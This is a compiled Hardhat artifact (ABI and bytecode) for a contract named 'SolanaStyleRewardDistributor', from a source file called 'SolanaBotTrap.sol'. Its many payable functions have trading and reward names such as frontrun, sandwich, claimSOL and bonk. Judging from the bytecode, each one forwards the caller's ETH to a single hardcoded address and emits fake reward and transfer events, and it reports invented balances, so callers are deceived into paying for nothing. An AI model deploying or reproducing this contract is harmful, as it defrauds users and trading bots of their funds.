{
  "_format": "hh-sol-artifact-1",
  "contractName": "SolanaStyleRewardDistributor",
  "sourceName": "contracts/SolanaBotTrap.sol",
  "abi": [
    {
      "inputs": [],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "user",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amountIn",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amountOut",
          "type": "uint256"
        }
      ],
      "name": "JupiterSwap",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "user",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "rewards",
          "type": "uint256"
        }
      ],
      "name": "RaydiumClaim",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "participant",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "tokens",
          "type": "uint256"
        }
      ],
      "name": "RewardDistributed",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "user",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "SolanaSync",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Transfer",
      "type": "event"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "arbitrage",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "backrun",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "bome",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "bonk",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "claimSOL",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "copyTrade",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "decimals",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "drift",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "epochRewards",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "flashloan",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "frontrun",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "getInteractionCount",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getParticipationFee",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "pure",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getTotalParticipants",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "governance",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "jito",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "jup",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "jupiterSwap",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "kamino",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "liquidation",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "liquidityMining",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "mango",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "marinade",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "meteora",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "mev",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "mew",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "myro",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "name",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "orcaSwap",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "phoenix",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "popcat",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "ray",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "raydiumClaim",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "sanctum",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "sandwich",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "serumTrade",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "slerf",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "snipe",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "solend",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "stakeSOL",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "symbol",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "tensor",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "totalSupply",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "unstakeSOL",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "validatorRewards",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "vesting",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "volume",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "wen",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "wif",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "yieldFarm",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x60c0604052601260809081527129b7b630b730902932bbb0b9323990243ab160711b60a052600190610031908261022e565b506040805180820190915260038152620a6a4960eb1b6020820152600290610059908261022e565b506003805460ff19166009179055670de0b6b3a764000060045534801561007f57600080fd5b50600080546001600160a01b0319167315e1a8454e2f31f64042eae445ec89266cb584be17815560088190556004546040513092917fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef916100e291815260200190565b60405180910390a360005460405166b1a2bc2ec5000081526001600160a01b03909116907f50e069678a3df12fbe86d1afd973361844b2a496bd2992e7063d5a15f7582b979060200160405180910390a260005460408051683635c9adc5dea0000081526601c6bf5263400060208201526001600160a01b03909216917fda13a851f9f3a4378c79402a2a8c0f352364f72e3ba805d3e3d4bc0f03e4c918910160405180910390a26102ec565b634e487b7160e01b600052604160045260246000fd5b600181811c908216806101b957607f821691505b6020821081036101d957634e487b7160e01b600052602260045260246000fd5b50919050565b601f82111561022957806000526020600020601f840160051c810160208510156102065750805b601f840160051c820191505b818110156102265760008155600101610212565b50505b505050565b81516001600160401b038111156102475761024761018f565b61025b8161025584546101a5565b846101df565b6020601f82116001811461028f57600083156102775750848201515b600019600385901b1c1916600184901b178455610226565b600084815260208120601f198516915b828110156102bf578785015182556020948501946001909201910161029f565b50848210156102dd5786840151600019600387901b60f8161c191681555b50505050600190811b01905550565b610df9806102fb6000396000f3fe6080604052600436106102e85760003560e01c80635d1e36161161019057806389cf3eeb116100dc578063c58e827611610095578063e7c7477a1161006f578063e7c7477a146106bc578063ef9411cc146106c4578063f2dfbf66146106cc578063f8854760146106d4576103d8565b8063c58e8276146106a4578063c618a1e4146106ac578063d3b33b63146106b4576103d8565b806389cf3eeb1461065a57806395d89b4114610662578063978dc1ea14610677578063a90cc4451461067f578063b132377914610694578063be8614401461069c576103d8565b8063773f7a3a11610149578063823ac84211610123578063823ac8421461062957806382a761f01461063157806385b2d53514610639578063863fc11e14610641576103d8565b8063773f7a3a146106115780637af3b822146106195780638191b45b14610621576103d8565b80635d1e3616146105c95780636590a477146105d157806369c8d338146105d95780636da3c0d5146105e157806370a08231146105e95780637495b37214610609576103d8565b80631e092efb1161024f5780634947bfda1161020857806355905e71116101e257806355905e71146105a95780635aa6e675146105b15780635b1614fc146105b95780635c69f9da146105c1576103d8565b80634947bfda146105635780634c5a0aaa1461056b57806353767ca4146105a1576103d8565b80631e092efb1461050f57806322b689d514610517578063313ce5671461051f57806339b0ff211461054b578063416a8b201461055357806344c63eec1461055b576103d8565b806313c9b33a116102a157806313c9b33a146104c357806318160ddd146104cb578063194ea505146104ef5780631ac19af7146104f75780631b89b61a146104ff5780631dd13e2514610507576103d8565b806302fdfcaf1461047857806306fdde031461048057806307824c06146104ab5780630c60e091146104b35780630f405257146104b3578063117fa591146104bb576103d8565b366103d8576102f6336106dc565b600080546040516001600160a01b039091169034908381818185875af1925050503d8060008114610343576040519150601f19603f3d011682016040523d82523d6000602084013e610348565b606091505b50509050806103975760405162461bcd60e51b8152602060048201526016602482015275111a5c9958dd081d1c985b9cd9995c8819985a5b195960521b60448201526064015b60405180910390fd5b337fe34918ff1c7084970068b53fd71ad6d8b04e9f15d3886cbf006443e6cdc52ea66103c534612710610cd5565b60405190815260200160405180910390a2005b6103e1336106dc565b600080546040516001600160a01b039091169034908381818185875af1925050503d806000811461042e576040519150601f19603f3d011682016040523d82523d6000602084013e610433565b606091505b50509050806104765760405162461bcd60e51b815260206004820152600f60248201526e11985b1b189858dac819985a5b1959608a1b604482015260640161038e565b005b610476610795565b34801561048c57600080fd5b506104956107a7565b6040516104a29190610cf2565b60405180910390f35b610476610835565b610476610845565b610476610855565b610476610865565b3480156104d757600080fd5b506104e160045481565b6040519081526020016104a2565b610476610875565b610476610885565b610476610895565b6104766108a5565b6104766108b5565b6104766108c5565b34801561052b57600080fd5b506003546105399060ff1681565b60405160ff90911681526020016104a2565b6104766108d5565b6104766108e5565b6104766108f5565b610476610905565b34801561057757600080fd5b506104e1610586366004610d40565b6001600160a01b031660009081526006602052604090205490565b610476610915565b610476610925565b610476610935565b610476610945565b610476610955565b610476610965565b610476610975565b610476610985565b610476610995565b3480156105f557600080fd5b506104e1610604366004610d40565b6109a5565b610476610a1a565b610476610a2a565b610476610a3a565b610476610a4a565b610476610a5a565b610476610a6a565b610476610a7a565b34801561064d57600080fd5b50655af3107a40006104e1565b610476610a8a565b34801561066e57600080fd5b50610495610a9a565b610476610aa7565b34801561068b57600080fd5b506008546104e1565b610476610ab7565b610476610ac7565b610476610ad7565b610476610ae7565b610476610af7565b610476610b07565b610476610b17565b610476610b27565b610476610b37565b6001600160a01b038116600090815260056020526040812054900361075c576008805490600061070b83610d70565b9091555050600780546001810182556000919091527fa66cc928b5edb82af9bd49922954155ab7b0942694bea4ce44661d9a8736c6880180546001600160a01b0319166001600160a01b0383161790555b6001600160a01b03811660009081526005602090815260408083204290556006909152812080549161078d83610d70565b919050555050565b6107a53365246139ca8000610b43565b565b600180546107b490610d89565b80601f01602080910402602001604051908101604052809291908181526020018280546107e090610d89565b801561082d5780601f106108025761010080835404028352916020019161082d565b820191906000526020600020905b81548152906001019060200180831161081057829003601f168201915b505050505081565b6107a533651e0369471000610b43565b6107a5336512309ce54000610b43565b6107a533650da475abf000610b43565b6107a533651b48eb57e000610b43565b6107a5336510d35deda800610b43565b6107a533651fd512913000610b43565b6107a5336516bcc41e9000610b43565b6107a533651402462f6000610b43565b6107a533651476b081e800610b43565b6107a533652632e314a000610b43565b6107a533651977420dc000610b43565b6107a533652ba7def30000610b43565b6107a5336511bc3292b800610b43565b6107a533650a012317b000610b43565b6107a533650bd2cc61d000610b43565b6107a533652d79883d2000610b43565b6107a533650f01b4a38800610b43565b6107a533650cbba106e000610b43565b6107a5336521a6bbdb5000610b43565b6107a5336514eb1ad47000610b43565b6107a5336508a3e4201800610b43565b6107a53365105ef39b2000610b43565b6107a533650b5e620f4800610b43565b60006001600160a01b0382166109bd57506000919050565b6000546001600160a01b03908116908316036109e2575067016345785d8a0000919050565b6001600160a01b03821660009081526005602052604090205415610a0d575065048c27395000919050565b50650246139ca800919050565b6107a5336507bb0f7b0800610b43565b6107a533651319718a5000610b43565b6107a5336509184e72a000610b43565b6107a5336506d23ad5f800610b43565b6107a533650a758d6a3800610b43565b6107a533651147c8403000610b43565b6107a5336515d3ef798000610b43565b6107a533653205af767000610b43565b600280546107b490610d89565b6107a53365082f79cd9000610b43565b6107a533650746a5288000610b43565b6107a533650ae9f7bcc000610b43565b6107a533650e18dffe7800610b43565b6107a533650fea89489800610b43565b6107a533650800e8dfc000610b43565b6107a53365098cb8c52800610b43565b6107a5336528ed6103d000610b43565b6107a533650e8d4a510000610b43565b6107a53365228f908060005b655af3107a4000341015610b995760405162461bcd60e51b815260206004820152601760248201527f4665653a20302e3030303120455448206d696e696d756d000000000000000000604482015260640161038e565b610ba2826106dc565b600080546040516001600160a01b039091169034908381818185875af1925050503d8060008114610bef576040519150601f19603f3d011682016040523d82523d6000602084013e610bf4565b606091505b5050905080610c375760405162461bcd60e51b815260206004820152600f60248201526e151c985b9cd9995c8819985a5b1959608a1b604482015260640161038e565b826001600160a01b03167fe34918ff1c7084970068b53fd71ad6d8b04e9f15d3886cbf006443e6cdc52ea683604051610c7291815260200190565b60405180910390a26040518281526001600160a01b0384169030907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9060200160405180910390a3505050565b634e487b7160e01b600052601160045260246000fd5b8082028115828204841417610cec57610cec610cbf565b92915050565b602081526000825180602084015260005b81811015610d205760208186018101516040868401015201610d03565b506000604082850101526040601f19601f83011684010191505092915050565b600060208284031215610d5257600080fd5b81356001600160a01b0381168114610d6957600080fd5b9392505050565b600060018201610d8257610d82610cbf565b5060010190565b600181811c90821680610d9d57607f821691505b602082108103610dbd57634e487b7160e01b600052602260045260246000fd5b5091905056fea264697066735822122048fc33b20452cc498a3b94f30a566dd3b49c536df1feea8bf8f0ef428ad9c8b264736f6c634300081c0033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}